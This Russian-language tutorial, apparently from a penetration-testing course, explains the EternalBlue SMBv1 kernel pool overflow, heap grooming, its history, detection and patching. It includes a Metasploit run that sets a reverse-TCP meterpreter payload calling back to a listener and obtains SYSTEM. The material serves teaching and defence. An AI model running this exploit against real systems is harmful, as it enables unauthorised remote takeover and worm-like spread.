## Вопрос, с которого всё начинается

В 2017 году червь **WannaCry** за считанные дни поразил сотни тысяч машин по
всему миру — больницы, заводы, банки. Вектор был один: уязвимость **EternalBlue**
в протоколе SMBv1. Она позволяла отправить один специально собранный сетевой
пакет на порт 445 и получить **выполнение кода в ядре** Windows. Разберём, как
это устроено.

## Наш пример

Смотрим, слушает ли цель SMB:

```
$ nmap -p445 --script smb-vuln-ms17-010 10.10.10.40
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

Nmap подтвердил уязвимость. Обрати внимание: проверка безобидна — она лишь
спрашивает сервер, уязвим ли он, не эксплуатируя переполнение.

## Шаг 1: что такое SMB и SMBv1

**SMB (Server Message Block)** — протокол общего доступа к файлам и принтерам в
Windows. Первая версия, **SMBv1**, появилась ещё в 1980-х и к 2017 году была
морально устаревшей, но включённой по умолчанию ради совместимости.

SMBv1 работает через **NetBIOS over TCP** на порту 445. Клиент отправляет
запросы разных типов; сервер (`srv.sys`, `srvnet.sys` — драйверы ядра) их
обрабатывает. Именно в обработке одного типа запроса и живёт уязвимость.

## Шаг 2: где переполнение

EternalBlue эксплуатирует ошибку в обработке **SMB1 Trans2/NT Trans** запросов.
Сервер выделяет буфер в **non-paged pool** (пул памяти ядра, который нельзя
выгрузить на диск) под данные запроса. Из-за неверного подсчёта размера
выделяется буфер меньше, чем нужно, и последующее копирование переполняет его.

Термин: **non-paged pool** — область памяти ядра, всегда находящаяся в
физической памяти. Объекты в ней не выгружаются, поэтому переполнение пула
напрямую портит структуры ядра.

Эксплойт:

1. Устанавливает SMBv1-сессию и «нейтрализует» буфер обмена (grooming).
2. Отправляет NT Trans запрос с особым `Function`/`TotalDataCount`, из-за
   которого сервер выделяет маленький буфер, а копирует много.
3. Переполняет пул и перезаписывает соседнюю структуру — например,
   `SRVNET_BUFFER_HDR` с указателем на функцию обратного вызова.
4. Подставляет свой указатель на kernel shellcode.
5. Триггерит вызов — ядро исполняет shellcode.

## Шаг 3: что делает kernel shellcode

Shellcode в ядре (ring 0) имеет максимальные права. Классический EternalBlue
shellcode:

- находит структуру процесса `EPROCESS` текущего процесса;
- подменяет `Token` на токен процесса `SYSTEM` (PID 4);
- создаёт новый поток в user-space (например, `rundll32`), который отдаёт
  reverse shell.

Поскольку это ring 0, обход ASLR и других user-space защит не нужен — ядро и так
может всё. Именно поэтому EternalBlue так «чисто» работал на огромном числе
систем.

## Шаг 4: полный прогон

Через Metasploit (легально, на своей лабораторной цели):

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.40
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5
msf6 > run
[*] Sending stage...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`NT AUTHORITY\SYSTEM` — это высшая локальная привилегия в Windows, эквивалент
root. Обрати внимание: мы читаем `getuid` обратно, а не верим факту запуска.

## Шаг 5: почему это стало переломом

До EternalBlue эксплойты для Windows были редки и требовали ручной подгонки.
После его утечки (группа Shadow Brokers выложила инструменты АНБ) появились:

- **WannaCry** — червь-шифровальщик, автономно распространявшийся по SMB.
- **NotPetya** — уничтожал данные, нанёс ущерб в миллиарды долларов.
- **Множество ботнетов** — майнеры и backdoor'ы по всему интернету.

Это заставило Microsoft выпустить патч даже для неподдерживаемых систем
(XP, 2003) и ускорило отказ от SMBv1 во всём мире.

## Шаг 6: как проверить и защититься

Проверка (безопасная):

```
$ nmap -p445 --script smb-vuln-ms17-010 10.10.10.40
```

Защита:

- **Патч MS17-010** (март 2017) — обязателен.
- **Отключить SMBv1** — `Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol`.
- **Блокировать порт 445** на периметре — SMB не должен быть виден из интернета.
- **Сегментация сети** — чтобы заражение не распространялось.

## Шаг 7: почему это всё ещё встречается

Спустя годы EternalBlue по-прежнему находят в эксплуатации, потому что:

- множество систем не обновлялись (промышленные, медицинские);
- SMBv1 включают «для совместимости» с legacy-оборудованием;
- порт 445 открыт наружу из-за ошибок конфигурации;
- в облаках встречаются старые Windows-образы.

Для пентестера это означает: при виде открытого 445 на старом Windows первым
делом проверяют MS17-010.

## Устройство пула ядра Windows

Чтобы понять эксплуатацию, нужно знать, как Windows управляет памятью ядра.

- **Paged pool** — пул, который может быть выгружен на диск. Здесь живут объекты,
  которым не обязательно быть в RAM постоянно.
- **Non-paged pool** — пул, всегда в физической памяти. Здесь — критичные
  структуры, в том числе сетевые буферы `srvnet`.
- **Аллокатор** — пул разбит на блоки фиксированных размеров; рядом лежат объекты
  разных типов.

EternalBlue переполняет буфер в non-paged pool. Поскольку рядом находятся другие
объекты (например, `SRVNET_BUFFER_HDR`), переполнение может испортить указатель
в одном из них. Если этот указатель используется как функция обратного вызова —
получаем исполнение кода.

Важно: в non-paged pool раскладка предсказуемее, чем в user-space, потому что
аллокации делает ядро. Именно поэтому EternalBlue был относительно стабилен.

## Как работает grooming (укладка пула)

Эксплойт не «стреляет» сразу — он сначала готовит память:

1. **Heap spray.** Атакующий создаёт много объектов одного размера, чтобы
   занять свободные слоты и предсказать, где окажется цель.
2. **Hole creation.** Освобождает часть объектов, создавая «дыры» известного
   размера.
3. **Trigger.** Переполнение попадает ровно в дыру, перезаписывая нужную
   структуру.

Эта техника называется **heap grooming** и встречается во всех серьёзных
эксплойтах — и в user-space, и в ядре. Без неё переполнение просто уронит
систему (BSOD) вместо выполнения кода.

## Связанные уязвимости SMB

SMBv1 дал не только EternalBlue. В той же утечке Shadow Brokers были:

- **EternalRomance** — переполнение в SMBv1 (CVE-2017-0145).
- **EternalChampion** — ещё одна ошибка SMBv1 (CVE-2017-0146).
- **EternalSynergy** — вариант для других версий (CVE-2017-0143).
- **SMBGhost** (CVE-2020-0796) — уже в SMBv3, тоже переполнение, тоже RCE.

Все они эксплуатируют ошибки обработки сетевых запросов драйверами ядра. Это
показывает, насколько важно закрывать порт 445 от недоверенных сетей.

## Как детектировать эксплуатацию

Защитники смотрят на:

- множественные SMB-сессии с подозрительными NT Trans запросами;
- необычные размеры `TotalDataCount` в логах SMB;
- появление процессов, порождённых `spoolsv`/`services.exe` без причины;
- исходящие соединения из `SYSTEM`-процессов (reverse shell);
- алерты EDR на запись в память ядра.

Даже успешный EternalBlue оставляет следы — вопрос лишь в том, есть ли
мониторинг, который их видит.

## Мини-лаборатория: как воспроизвести безопасно

Никогда не запускай EternalBlue на реальной сети — это червь-класс уязвимость.
Правильный путь — изолированная лаборатория:

1. **Разверни уязвимую Windows** (например, Windows 7 SP1 x64 без патча MS17-010)
   в виртуальной машине с host-only сетью.
2. **Убедись, что SMBv1 включён** и порт 445 доступен только внутри лаборатории.
3. **Проверь уязвимость** скриптом `smb-vuln-ms17-010`, а не сразу эксплойтом.
4. **Запусти эксплойт** с listener'ом, направленным на твою же лабораторную сеть.
5. **Проверь результат** через `getuid` — должен быть `NT AUTHORITY\SYSTEM`.
6. **Зафиксируй находку** и выключи лабораторию.

Такой подход даёт понимание без риска. Помни: неправильно запущенный EternalBlue
может заразить всю доступную сеть через SMB — именно так работали WannaCry и
NotPetya.

## Итог по технике

EternalBlue — это не «магия», а классическая цепочка: **сетевой парсер → ошибка
размера → переполнение пула → подмена указателя → kernel shellcode → SYSTEM**.
Если разложить её на шаги, каждый из них знаком по user-space эксплуатации. Новое
здесь только среда (ядро Windows) и объекты (пул, `SRVNET_BUFFER_HDR`). Освоив эту
схему, ты легко поймёшь и другие SMB-CVE.

## Что если не сработало

| Симптом | Причина | Что делать |
|---|---|---|
| `not vulnerable` | патчено/SMBv1 off | искать другой вектор |
| порт закрыт | firewall | сканировать другие |
| сессия рвётся | несовместимая версия | подобрать эксплойт |
| BSOD | переполнение ушло не туда | цель может упасть — осторожно |

Важно: неудачный EternalBlue может вызвать **синий экран (BSOD)**. На боевой
цели это потеря доступа и заметность, поэтому сначала проверяют скриптом, а
эксплуатируют только при уверенности.

## Что мы теперь знаем

- EternalBlue — переполнение пула ядра в SMBv1.
- Уязвимость даёт удалённое выполнение кода с правами SYSTEM.
- Эксплуатация не требует обхода user-space защит (ring 0).
- Защита: патч MS17-010, отключение SMBv1, блокировка 445.
- Баг всё ещё встречается из-за legacy-систем.

## Куда дальше

EternalBlue — сетевой RCE. Дальше — **Zerologon**: уязвимость аутентификации в
Netlogon, которая позволяет захватить контроллер домена без единого пароля. Там
нет переполнения — только криптографическая ошибка. А пока запомни: **SMBv1 +
непропатченный Windows = один пакет до SYSTEM**.

## Где пригодится

- Пентест внутренних сетей Windows.
- Понимание сетевых RCE и их последствий (черви).
- Проверка и харденинг SMB в инфраструктуре.
